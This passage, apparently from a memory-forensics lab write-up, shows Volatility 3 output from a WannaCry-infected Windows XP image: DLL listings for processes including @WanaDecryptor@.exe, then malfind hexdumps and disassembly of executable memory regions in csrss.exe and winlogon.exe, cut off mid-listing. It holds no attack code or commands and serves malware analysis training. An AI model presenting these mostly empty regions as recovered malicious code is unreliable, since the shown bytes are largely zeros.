260	svchost.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
260	svchost.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
260	svchost.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
260	svchost.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\system32\UxTheme.dll	N/A	Disabled
260	svchost.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
260	svchost.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
260	svchost.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
260	svchost.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
260	svchost.exe	0x5d090000	0x9a000	comctl32.dll	C:\WINDOWS\system32\comctl32.dll	N/A	Disabled
260	svchost.exe	0x77690000	0x21000	NTMARTA.DLL	C:\WINDOWS\system32\NTMARTA.DLL	N/A	Disabled
260	svchost.exe	0x71bf0000	0x13000	SAMLIB.dll	C:\WINDOWS\system32\SAMLIB.dll	N/A	Disabled
260	svchost.exe	0x76f60000	0x2c000	WLDAP32.dll	C:\WINDOWS\system32\WLDAP32.dll	N/A	Disabled
260	svchost.exe	0x6e0000	0x2c5000	xpsp2res.dll	C:\WINDOWS\system32\xpsp2res.dll	N/A	Disabled
260	svchost.exe	0x5a6e0000	0x15000	webclnt.dll	c:\windows\system32\webclnt.dll	N/A	Disabled
260	svchost.exe	0x3d930000	0xe7000	WININET.dll	C:\WINDOWS\system32\WININET.dll	N/A	Disabled
260	svchost.exe	0x670000	0x9000	Normaliz.dll	C:\WINDOWS\system32\Normaliz.dll	N/A	Disabled
260	svchost.exe	0x78130000	0x134000	urlmon.dll	C:\WINDOWS\system32\urlmon.dll	N/A	Disabled
260	svchost.exe	0x3dfd0000	0x1ec000	iertutil.dll	C:\WINDOWS\system32\iertutil.dll	N/A	Disabled
260	svchost.exe	0x71ab0000	0x17000	WS2_32.dll	c:\windows\system32\WS2_32.dll	N/A	Disabled
260	svchost.exe	0x71aa0000	0x8000	WS2HELP.dll	c:\windows\system32\WS2HELP.dll	N/A	Disabled
740	@WanaDecryptor@	0x400000	0x3d000	@WanaDecryptor@.exe	C:\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe	N/A	Disabled
740	@WanaDecryptor@	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
740	@WanaDecryptor@	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
740	@WanaDecryptor@	0x73dd0000	0xf2000	MFC42.DLL	C:\WINDOWS\system32\MFC42.DLL	N/A	Disabled
740	@WanaDecryptor@	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
740	@WanaDecryptor@	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
740	@WanaDecryptor@	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
740	@WanaDecryptor@	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
740	@WanaDecryptor@	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
740	@WanaDecryptor@	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
740	@WanaDecryptor@	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
740	@WanaDecryptor@	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
740	@WanaDecryptor@	0x773d0000	0x103000	COMCTL32.dll	C:\WINDOWS\WinSxS\X86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\COMCTL32.dll	N/A	Disabled
740	@WanaDecryptor@	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
740	@WanaDecryptor@	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
740	@WanaDecryptor@	0x78130000	0x134000	urlmon.dll	C:\WINDOWS\system32\urlmon.dll	N/A	Disabled
740	@WanaDecryptor@	0x3dfd0000	0x1ec000	iertutil.dll	C:\WINDOWS\system32\iertutil.dll	N/A	Disabled
740	@WanaDecryptor@	0x76080000	0x65000	MSVCP60.dll	C:\WINDOWS\system32\MSVCP60.dll	N/A	Disabled
740	@WanaDecryptor@	0x71ab0000	0x17000	WS2_32.dll	C:\WINDOWS\system32\WS2_32.dll	N/A	Disabled
740	@WanaDecryptor@	0x71aa0000	0x8000	WS2HELP.dll	C:\WINDOWS\system32\WS2HELP.dll	N/A	Disabled
740	@WanaDecryptor@	0x3d930000	0xe7000	WININET.dll	C:\WINDOWS\system32\WININET.dll	N/A	Disabled
740	@WanaDecryptor@	0x340000	0x9000	Normaliz.dll	C:\WINDOWS\system32\Normaliz.dll	N/A	Disabled
740	@WanaDecryptor@	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
740	@WanaDecryptor@	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
740	@WanaDecryptor@	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
740	@WanaDecryptor@	0x732e0000	0x5000	RICHED32.DLL	C:\WINDOWS\system32\RICHED32.DLL	N/A	Disabled
740	@WanaDecryptor@	0x74e30000	0x6d000	RICHED20.dll	C:\WINDOWS\system32\RICHED20.dll	N/A	Disabled
740	@WanaDecryptor@	0x5ad70000	0x38000	uxtheme.dll	C:\WINDOWS\system32\uxtheme.dll	N/A	Disabled
740	@WanaDecryptor@	0x74720000	0x4c000	MSCTF.dll	C:\WINDOWS\system32\MSCTF.dll	N/A	Disabled
740	@WanaDecryptor@	0x755c0000	0x2e000	msctfime.ime	C:\WINDOWS\system32\msctfime.ime	N/A	Disabled
740	@WanaDecryptor@	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
740	@WanaDecryptor@	0xea0000	0x29000	msls31.dll	C:\WINDOWS\system32\msls31.dll	N/A	Disabled
1768	wuauclt.exe	0x400000	0xe000	wuauclt.exe	C:\WINDOWS\system32\wuauclt.exe	N/A	Disabled
1768	wuauclt.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
1768	wuauclt.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
1768	wuauclt.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
1768	wuauclt.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
1768	wuauclt.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
1768	wuauclt.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
1768	wuauclt.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
1768	wuauclt.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
1768	wuauclt.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
1768	wuauclt.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
1768	wuauclt.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
1768	wuauclt.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\system32\ShimEng.dll	N/A	Disabled
1768	wuauclt.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
1768	wuauclt.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\system32\WINMM.dll	N/A	Disabled
1768	wuauclt.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\system32\MSACM32.dll	N/A	Disabled
1768	wuauclt.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
1768	wuauclt.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
1768	wuauclt.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
1768	wuauclt.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\system32\UxTheme.dll	N/A	Disabled
1768	wuauclt.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
1768	wuauclt.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
1768	wuauclt.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
1768	wuauclt.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
1768	wuauclt.exe	0x50040000	0x1da000	wuaueng.dll	C:\WINDOWS\system32\wuaueng.dll	N/A	Disabled
1768	wuauclt.exe	0x71ab0000	0x17000	WS2_32.dll	C:\WINDOWS\system32\WS2_32.dll	N/A	Disabled
1768	wuauclt.exe	0x71aa0000	0x8000	WS2HELP.dll	C:\WINDOWS\system32\WS2HELP.dll	N/A	Disabled
1768	wuauclt.exe	0x606b0000	0x10d000	ESENT.dll	C:\WINDOWS\system32\ESENT.dll	N/A	Disabled
1768	wuauclt.exe	0x76f50000	0x8000	WTSAPI32.dll	C:\WINDOWS\system32\WTSAPI32.dll	N/A	Disabled
1768	wuauclt.exe	0x76360000	0x10000	WINSTA.dll	C:\WINDOWS\system32\WINSTA.dll	N/A	Disabled
1768	wuauclt.exe	0x5b860000	0x56000	NETAPI32.dll	C:\WINDOWS\system32\NETAPI32.dll	N/A	Disabled
1768	wuauclt.exe	0x73000000	0x26000	WINSPOOL.DRV	C:\WINDOWS\system32\WINSPOOL.DRV	N/A	Disabled
1768	wuauclt.exe	0x76d60000	0x19000	IPHLPAPI.DLL	C:\WINDOWS\system32\IPHLPAPI.DLL	N/A	Disabled
1768	wuauclt.exe	0x4d4f0000	0x59000	WINHTTP.dll	C:\WINDOWS\system32\WINHTTP.dll	N/A	Disabled
1768	wuauclt.exe	0x76c30000	0x2e000	WINTRUST.dll	C:\WINDOWS\system32\WINTRUST.dll	N/A	Disabled
1768	wuauclt.exe	0x77a80000	0x97000	CRYPT32.dll	C:\WINDOWS\system32\CRYPT32.dll	N/A	Disabled
1768	wuauclt.exe	0x77b20000	0x12000	MSASN1.dll	C:\WINDOWS\system32\MSASN1.dll	N/A	Disabled
1768	wuauclt.exe	0x76c90000	0x28000	IMAGEHLP.dll	C:\WINDOWS\system32\IMAGEHLP.dll	N/A	Disabled
1768	wuauclt.exe	0x75150000	0x13000	Cabinet.dll	C:\WINDOWS\system32\Cabinet.dll	N/A	Disabled
1768	wuauclt.exe	0x600a0000	0xb000	mspatcha.dll	C:\WINDOWS\system32\mspatcha.dll	N/A	Disabled
1768	wuauclt.exe	0xbc0000	0x2c5000	xpsp2res.dll	C:\WINDOWS\system32\xpsp2res.dll	N/A	Disabled
1768	wuauclt.exe	0x76fd0000	0x7f000	CLBCATQ.DLL	C:\WINDOWS\system32\CLBCATQ.DLL	N/A	Disabled
1768	wuauclt.exe	0x77050000	0xc5000	COMRes.dll	C:\WINDOWS\system32\COMRes.dll	N/A	Disabled
1768	wuauclt.exe	0x50f00000	0xd000	wups2.dll	C:\WINDOWS\system32\wups2.dll	N/A	Disabled
544	alg.exe	0x1000000	0xd000	alg.exe	C:\WINDOWS\System32\alg.exe	N/A	Disabled
544	alg.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
544	alg.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
544	alg.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
544	alg.exe	0x76b20000	0x11000	ATL.DLL	C:\WINDOWS\System32\ATL.DLL	N/A	Disabled
544	alg.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
544	alg.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
544	alg.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
544	alg.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
544	alg.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
544	alg.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
544	alg.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
544	alg.exe	0x71ad0000	0x9000	WSOCK32.dll	C:\WINDOWS\System32\WSOCK32.dll	N/A	Disabled
544	alg.exe	0x71ab0000	0x17000	WS2_32.dll	C:\WINDOWS\System32\WS2_32.dll	N/A	Disabled
544	alg.exe	0x71aa0000	0x8000	WS2HELP.dll	C:\WINDOWS\System32\WS2HELP.dll	N/A	Disabled
544	alg.exe	0x71a50000	0x3f000	MSWSOCK.DLL	C:\WINDOWS\System32\MSWSOCK.DLL	N/A	Disabled
544	alg.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\System32\ShimEng.dll	N/A	Disabled
544	alg.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
544	alg.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\System32\WINMM.dll	N/A	Disabled
544	alg.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\System32\MSACM32.dll	N/A	Disabled
544	alg.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
544	alg.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
544	alg.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
544	alg.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
544	alg.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\System32\UxTheme.dll	N/A	Disabled
544	alg.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
544	alg.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\System32\LPK.DLL	N/A	Disabled
544	alg.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\System32\USP10.dll	N/A	Disabled
544	alg.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
544	alg.exe	0x5d090000	0x9a000	comctl32.dll	C:\WINDOWS\system32\comctl32.dll	N/A	Disabled
544	alg.exe	0x76fd0000	0x7f000	CLBCATQ.DLL	C:\WINDOWS\System32\CLBCATQ.DLL	N/A	Disabled
544	alg.exe	0x77050000	0xc5000	COMRes.dll	C:\WINDOWS\System32\COMRes.dll	N/A	Disabled
544	alg.exe	0x6e0000	0x2c5000	xpsp2res.dll	C:\WINDOWS\System32\xpsp2res.dll	N/A	Disabled
544	alg.exe	0x662b0000	0x58000	hnetcfg.dll	C:\WINDOWS\system32\hnetcfg.dll	N/A	Disabled
544	alg.exe	0x71a90000	0x8000	wshtcpip.dll	C:\WINDOWS\System32\wshtcpip.dll	N/A	Disabled
1168	wscntfy.exe	0x1000000	0x6000	wscntfy.exe	C:\WINDOWS\system32\wscntfy.exe	N/A	Disabled
1168	wscntfy.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
1168	wscntfy.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
1168	wscntfy.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
1168	wscntfy.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
1168	wscntfy.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
1168	wscntfy.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
1168	wscntfy.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
1168	wscntfy.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
1168	wscntfy.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
1168	wscntfy.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
1168	wscntfy.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
1168	wscntfy.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
1168	wscntfy.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
1168	wscntfy.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
1168	wscntfy.exe	0x7d0000	0x2c5000	xpsp2res.dll	C:\WINDOWS\system32\xpsp2res.dll	N/A	Disabled
1168	wscntfy.exe	0x5ad70000	0x38000	uxtheme.dll	C:\WINDOWS\system32\uxtheme.dll	N/A	Disabled
1168	wscntfy.exe	0x74720000	0x4c000	MSCTF.dll	C:\WINDOWS\system32\MSCTF.dll	N/A	Disabled
1168	wscntfy.exe	0x755c0000	0x2e000	msctfime.ime	C:\WINDOWS\system32\msctfime.ime	N/A	Disabled
1168	wscntfy.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
```


#### `windows.malfind.Malfind`

Lets take a look at `Malfind`

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.malfind.Malfind
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished                        
PID	Process	Start VPN	End VPN	Tag	Protection	CommitCharge	PrivateMemory	File output	Hexdump	Disasm

596	csrss.exe	0x7f6f0000	0x7f7effff	Vad 	PAGE_EXECUTE_READWRITE	0	0	Disabled	
c8 00 00 00 8b 01 00 00	........
ff ee ff ee 08 70 00 00	.....p..
08 00 00 00 00 fe 00 00	........
00 00 10 00 00 20 00 00	........
00 02 00 00 00 20 00 00	........
8d 01 00 00 ff ef fd 7f	........
03 00 08 06 00 00 00 00	........
00 00 00 00 00 00 00 00	........	
0x7f6f0000:	enter	0, 0
0x7f6f0004:	mov	eax, dword ptr [ecx]
0x7f6f0006:	add	byte ptr [eax], al
620	winlogon.exe	0x21400000	0x21403fff	VadS	PAGE_EXECUTE_READWRITE	4	1	Disabled	
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 28 00 28 00	....(.(.
01 00 00 00 00 00 00 00	........	
0x21400000:	add	byte ptr [eax], al
0x21400002:	add	byte ptr [eax], al
0x21400004:	add	byte ptr [eax], al
0x21400006:	add	byte ptr [eax], al
0x21400008:	add	byte ptr [eax], al
0x2140000a:	add	byte ptr [eax], al
0x2140000c:	add	byte ptr [eax], al
0x2140000e:	add	byte ptr [eax], al
0x21400010:	add	byte ptr [eax], al
0x21400012:	add	byte ptr [eax], al
0x21400014:	add	byte ptr [eax], al
0x21400016:	add	byte ptr [eax], al
0x21400018:	add	byte ptr [eax], al
0x2140001a:	add	byte ptr [eax], al
0x2140001c:	add	byte ptr [eax], al
0x2140001e:	add	byte ptr [eax], al
0x21400020:	add	byte ptr [eax], al
0x21400022:	add	byte ptr [eax], al
0x21400024:	add	byte ptr [eax], al
0x21400026:	add	byte ptr [eax], al
0x21400028:	add	byte ptr [eax], al
0x2140002a:	add	byte ptr [eax], al
0x2140002c:	add	byte ptr [eax], al
0x2140002e:	add	byte ptr [eax], al
0x21400030:	add	byte ptr [eax], al
0x21400032:	add	byte ptr [eax], al
0x21400034:	sub	byte ptr [eax], al
0x21400036:	sub	byte ptr [eax], al
0x21400038:	add	dword ptr [eax], eax
0x2140003a:	add	byte ptr [eax], al
0x2140003c:	add	byte ptr [eax], al
0x2140003e:	add	byte ptr [eax], al
620	winlogon.exe	0x3f8b0000	0x3f8b3fff	VadS	PAGE_EXECUTE_READWRITE	4	1	Disabled	
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 25 00 25 00	....%.%.
01 00 00 00 00 00 00 00	........	
0x3f8b0000:	add	byte ptr [eax], al
0x3f8b0002:	add	byte ptr [eax], al
0x3f8b0004:	add	byte ptr [eax], al
0x3f8b0006:	add	byte ptr [eax], al
0x3f8b0008:	add	byte ptr [eax], al
0x3f8b000a:	add	byte ptr [eax], al
0x3f8b000c:	add	byte ptr [eax], al
0x3f8b000e:	add	byte ptr [eax], al
0x3f8b0010:	add	byte ptr [eax], al
0x3f8b0012:	add	byte ptr [eax], al
0x3f8b0014:	add	byte ptr [eax], al
0x3f8b0016:	add	byte ptr [eax], al
0x3f8b0018:	add	byte ptr [eax], al
0x3f8b001a:	add	byte ptr [eax], al
0x3f8b001c:	add	byte ptr [eax], al
0x3f8b001e:	add	byte ptr [eax], al
0x3f8b0020:	add	byte ptr [eax], al
0x3f8b0022:	add	byte ptr [eax], al
0x3f8b0024:	add	byte ptr [eax], al
0x3f8b0026:	add	byte ptr [eax], al
0x3f8b0028:	add	byte ptr [eax], al
0x3f8b002a:	add	byte ptr [eax], al
0x3f8b002c:	add	byte ptr [eax], al
0x3f8b002e:	add	byte ptr [eax], al
0x3f8b0030:	add	byte ptr [eax], al
0x3f8b0032:	add	byte ptr [eax], al
0x3f8b0034:	and	eax, 0x1002500
0x3f8b0039:	add	byte ptr [eax], al
0x3f8b003b:	add	byte ptr [eax], al
0x3f8b003d:	add	byte ptr [eax], al
620	winlogon.exe	0x44b90000	0x44b93fff	VadS	PAGE_EXECUTE_READWRITE	4	1	Disabled	
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 28 00 28 00	....(.(.
01 00 00 00 00 00 00 00	........	
0x44b90000:	add	byte ptr [eax], al
0x44b90002:	add	byte ptr [eax], al
0x44b90004:	add	byte ptr [eax], al
0x44b90006:	add	byte ptr [eax], al
0x44b90008:	add	byte ptr [eax], al
0x44b9000a:	add	byte ptr [eax], al
0x44b9000c:	add	byte ptr [eax], al
0x44b9000e:	add	byte ptr [eax], al
0x44b90010:	add	byte ptr [eax], al
0x44b90012:	add	byte ptr [eax], al
0x44b90014:	add	byte ptr [eax], al
0x44b90016:	add	byte ptr [eax], al
0x44b90018:	add	byte ptr [eax], al
0x44b9001a:	add	byte ptr [eax], al
0x44b9001c:	add	byte ptr [eax], al
0x44b9001e:	add	byte ptr [eax], al
0x44b90020:	add	byte ptr [eax], al
0x44b90022:	add	byte ptr [eax], al
0x44b90024:	add	byte ptr [eax], al
0x44b90026:	add	byte ptr [eax], al
0x44b90028:	add	byte ptr [eax], al
0x44b9002a:	add	byte ptr [eax], al
0x44b9002c:	add	byte ptr [eax], al
0x44b9002e:	add	byte ptr [eax], al
0x44b90030:	add	byte ptr [eax], al
0x44b90032:	add	byte ptr [eax], al
0x44b90034:	sub	byte ptr [eax], al
0x44b90036:	sub	byte ptr [eax], al
0x44b90038:	add	dword ptr [eax], eax
0x44b9003a:	add	byte ptr [eax], al
0x44b9003c:	add	byte ptr [eax], al
0x44b9003e:	add	byte ptr [eax], al
620	winlogon.exe	0x4ffd0000	0x4ffd3fff	VadS	PAGE_EXECUTE_READWRITE	4	1	Disabled	
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 2a 00 2a 00	....*.*.
01 00 00 00 00 00 00 00	........	
0x4ffd0000:	add	byte ptr [eax], al
0x4ffd0002:	add	byte ptr [eax], al
0x4ffd0004:	add	byte ptr [eax], al
0x4ffd0006:	add	byte ptr [eax], al
0x4ffd0008:	add	byte ptr [eax], al
0x4ffd000a:	add	byte ptr [eax], al
0x4ffd000c:	add	byte ptr [eax], al
0x4ffd000e:	add	byte ptr [eax], al
0x4ffd0010:	add	byte ptr [eax], al
0x4ffd0012:	add	byte ptr [eax], al
0x4ffd0014:	add	byte ptr [eax], al
0x4ffd0016:	add	byte ptr [eax], al
0x4ffd0018:	add	byte ptr [eax], al
0x4ffd001a:	add	byte ptr [eax], al
0x4ffd001c:	add	byte ptr [eax], al
0x4ffd001e:	add	byte ptr [eax], al
0x4ffd0020:	add	byte ptr [eax], al
0x4ffd0022:	add	byte ptr [eax], al
0x4ffd0024:	add	byte ptr [eax], al
0x4ffd0026:	add	byte ptr [eax], al
0x4ffd0028:	add	byte ptr [eax], al
0x4ffd002a:	add	byte ptr [eax], al
0x4ffd002c:	add	byte ptr [eax], al
0x4ffd002e:	add	byte ptr [eax], al
0x4ffd0030:	add	byte ptr [eax], al
0x4ffd0032:	add	byte ptr [eax], al
0x4ffd0034:	sub	al, byte ptr [eax]
0x4ffd0036:	sub	al, byte ptr [eax]
0x4ffd0038:	add	dword ptr [eax], eax
0x4ffd003a:	add	byte ptr [eax], al
0x4ffd003c:	add	byte ptr [eax], al
0x4ffd003e:	add	byte ptr [eax], al
620	winlogon.exe	0x49b10000	0x49b13fff	VadS	PAGE_EXECUTE_READWRITE	4	1	Disabled	
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 25 00 25 00	....%.%.
01 00 00 00 00 00 00 00	........	
0x49b10000:	add	byte ptr [eax], al
0x49b10002:	add	byte ptr [eax], al
0x49b10004:	add	byte ptr [eax], al
0x49b10006:	add	byte ptr [eax], al
0x49b10008:	add	byte ptr [eax], al
0x49b1000a:	add	byte ptr [eax], al
0x49b1000c:	add	byte ptr [eax], al
0x49b1000e:	add	byte ptr [eax], al
0x49b10010:	add	byte ptr [eax], al
0x49b10012:	add	byte ptr [eax], al
0x49b10014:	add	byte ptr [eax], al
0x49b10016:	add	byte ptr [eax], al
0x49b10018:	add	byte ptr [eax], al
0x49b1001a:	add	byte ptr [eax], al
0x49b1001c:	add	byte ptr [eax], al
0x49b1001e:	add	byte ptr [eax], al
0x49b10020:	add	byte ptr [eax], al
0x49b10022:	add	byte ptr [eax], al
0x49b10024:	add	byte ptr [eax], al
0x49b10026:	add	byte ptr [eax], al
0x49b10028:	add	byte ptr [eax], al
0x49b1002a:	add	byte ptr [eax], al
0x49b1002c:	add	byte ptr [eax], al
0x49b1002e:	add	byte ptr [eax], al
0x49b10030:	add	byte ptr [eax], al
0x49b10032:	add	byte ptr [eax], al
0x49b10034:	and	eax, 0x1002500
0x49b10039:	add	byte ptr [eax], al
0x49b1003b:	add	byte ptr [eax], al
0x49b1003d:	add	byte ptr [eax], al
620	winlogon.exe	0x57a50000	0x57a53fff	VadS	PAGE_EXECUTE_READWRITE	4	1	Disabled	
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 2c 00 2c 00	....,.,.
01 00 00 00 00 00 00 00	........	
0x57a50000:	add	byte ptr [eax], al
